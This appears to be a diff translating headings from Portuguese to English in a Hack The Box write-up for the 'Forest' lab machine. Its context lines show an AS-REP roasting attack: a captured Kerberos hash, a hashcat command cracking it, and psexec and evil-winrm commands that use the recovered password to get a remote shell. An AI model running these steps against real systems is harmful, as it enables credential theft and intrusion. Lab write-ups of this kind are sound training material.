@@ -337,7 +337,7 @@ $krb5asrep$23$svc-alfresco@HTB:754aaeb7cf647e5365424893ee7e7345$1f45e994ceeda5db
 ```
     
 
-### Quebrando o Hash
+### Cracking the Hash
 
 ```bash
 hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
@@ -349,7 +349,7 @@ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
 
 
 
-## Pegando Shell
+## Getting the Shell
 
 ### Psexec
 
@@ -357,7 +357,7 @@ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
 impacket-psexec htb.local/svc-alfresco:s3rvice@10.10.10.161
 ```
 
-***Sem sucesso!***
+***Without Success!***
 
 ### WinRM
 
@@ -365,7 +365,7 @@ impacket-psexec htb.local/svc-alfresco:s3rvice@10.10.10.161
 evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
 ```
 
-***Sucesso!***
+***Success!***
 
 ### HABEMUSS!!!
 
